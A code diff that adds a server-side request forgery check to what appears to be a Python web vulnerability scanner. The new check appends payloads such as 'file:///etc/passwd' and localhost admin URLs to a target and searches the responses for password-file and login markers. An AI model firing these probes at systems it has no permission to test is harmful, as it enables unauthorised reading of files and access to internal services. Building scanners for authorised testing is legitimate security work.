@@ -34,8 +34,9 @@ class Scanner:
         test4 = Scanner.test_sqli(url)
         test5 = Scanner.test_lfi(url)
         test6 = Scanner.test_cmdi(url)
+        test7 = Scanner.test_ssrf(url)
 
-        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}"
+        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}"
 
     def scan_for_server_version(self, url):
         req = requests.get(url)
@@ -45,7 +46,7 @@ class Scanner:
         return server
 
     def request_tamp(self, url):
-        return "Soon To Be Updated"
+        return "Under Development"
     
     def exploit_info(self,url):
         req = requests.get(url)
@@ -225,3 +226,30 @@ class Scanner:
                 return "LFI(Local File Inclusion)"
             else:
                 return ""
+    
+    def test_ssrf(url):
+        payload1 = "file:///etc/passwd"
+        payload2 = "file://\/\/etc/passwd"
+        paylaod3 = "http://127.0.0.1/phpmyadmin"
+        payload4 = "http://127.0.0.1/admin"
+        fattempt = f"{url}{payload1}"
+        sattempt = f"{url}{payload2}"
+        tattempt = f"{url}{paylaod3}"
+        ftattempt = f"{url}{payload4}"
+        req1 = requests.get(fattempt,verify=False)
+        req2 = requests.get(sattempt,verify=False)
+        req3 = requests.get(tattempt,verify=False)
+        req4 = requests.get(ftattempt,verify=False)
+        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
+            if 'root' in req1.text or 'root:x:' in req1.text or 'root:!:' in req1.text:
+                return "SSRF(Server Side Request Forgery)"
+            elif 'root' in req2.text or 'root:x:' in req2.text or 'root:!:' in req2.text:
+                return "SSRF(Server Side Request Forgery)"
+            elif 'phpmyadmin' in req3.text or 'password' in req3.text:
+                return "SSRF(Server Side Request Forgery)"
+            elif 'AdminLTE' in req4.text or 'password' in req4.text or 'username' in req4.text or 'login' in req4.text:
+                return "SSRF(Server Side Request Forgery)"
+            else:
+                return ""
+        else:
+            return ""
